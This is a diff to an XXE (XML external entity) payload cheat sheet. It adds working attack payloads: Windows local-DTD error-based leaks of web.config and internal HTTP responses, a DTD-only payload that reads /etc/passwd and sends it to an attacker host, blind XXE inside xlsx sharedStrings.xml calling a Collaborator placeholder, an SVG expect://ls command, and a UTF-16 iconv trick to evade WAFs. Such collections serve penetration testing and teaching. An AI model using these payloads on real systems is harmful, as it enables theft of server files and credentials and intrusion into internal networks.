@@ -26,11 +26,14 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
   - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
   - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
+- [Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents](#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents)
 - [XXE in exotic files](#xxe-in-exotic-files)
   - [XXE inside SVG](#xxe-inside-svg)
   - [XXE inside SOAP](#xxe-inside-soap)
   - [XXE inside DOCX file](#xxe-inside-docx-file)
   - [XXE inside XLSX file](#xxe-inside-xlsx-file)
+  - [XXE inside DTD file](#xxe-inside-dtd-file)
+- [XXE WAF Bypass via convert character encoding](#xxe-waf-bypass-via-convert-character-encoding)
 
 ## Tools
 
@@ -248,6 +251,9 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
 
+
+
+
 ## Exploiting blind XXE to exfiltrate data out-of-band
 
 Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.
@@ -370,13 +376,50 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
 
 
+
+## Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
+
+From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
+
+### Disclose local file
+
+```xml
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>cacat</xxx>
+```
+
+### Disclose HTTP Response:
+
+```xml
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>cacat</xxx>
+```
+
 ## XXE in exotic files
 
 ### XXE inside SVG
 
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
-    <image xlink:href="expect://ls"></image>
+    <image xlink:href="expect://ls" width="200" height="200"></image>
 </svg>
 ```
 
@@ -395,6 +438,7 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 *xxe.svg*
 
 ```xml
+<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
 <!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
@@ -461,7 +505,7 @@ GIF (experimental)
 
 Extract the excel file.
 
-```powershell
+```
 $ mkdir XXE && cd XXE
 $ unzip ../XXE.xlsx
 Archive:  ../XXE.xlsx
@@ -478,16 +522,24 @@ Archive:  ../XXE.xlsx
 
 Add your blind XXE payload inside `xl/workbook.xml`.
 
-```powershell
+```xml
 <xml...>
 <!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
 <x>&xxe;</x>
 <workbook...>
 ```
 
+Alternativly, add your payload in `xl/sharedStrings.xml`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
+```
+
 Rebuild the Excel file.
 
-```powershell
+```
 $ zip -r ../poc.xlsx *
 updating: [Content_Types].xml (deflated 71%)
 updating: _rels/ (stored 0%)
@@ -505,6 +557,32 @@ updating: xl/theme/theme1.xml (deflated 80%)
 updating: xl/_rels/ (stored 0%)
 updating: xl/_rels/workbook.xml.rels (deflated 66%)
 updating: xl/sharedStrings.xml (deflated 17%)
+```
+
+### XXE inside DTD file
+
+Most XXE payloads detailed above require control over both the DTD or `DOCTYPE` block as well as the `xml` file.
+In rare situations, you may only control the DTD file and won't be able to modify the `xml` file. For example, a MITM.
+When all you control is the DTD file, and you do not control the `xml` file, XXE may still be possible with this payload.
+
+```xml
+<!-- Load the contents of a sensitive file into a variable -->
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
+%param1;
+%external;
+```
+
+### XXE WAF Bypass via convert character encoding
+
+In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding<br><br>
+`All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode` 
+-- https://www.w3.org/XML/xml-V10-4e-errata#E11
+<br><br>
+we can convert the character encoding to `UTF-16` using [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html) to bypass the XXE WAF:-<br>
+```bash
+cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 ```
 
 
@@ -527,6 +605,7 @@ updating: xl/sharedStrings.xml (deflated 17%)
 * [Web Security Academy >> XML external entity (XXE) injection - 2019 PortSwigger Ltd](https://portswigger.net/web-security/xxe)
 * [Automating local DTD discovery for XXE exploitation](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation) - July 16 2019 by Philippe Arteau
 * [EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
+* [excel-reader-xlsx #10](https://github.com/jmcnamara/excel-reader-xlsx/issues/10)
 * [Midnight Sun CTF 2019 Quals - Rubenscube](https://jbz.team/midnightsunctfquals2019/Rubenscube)
 * [SynAck - A Deep Dive into XXE Injection](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/) - 22 July 2019 - Trenton Gordon
 * [Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf) - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK
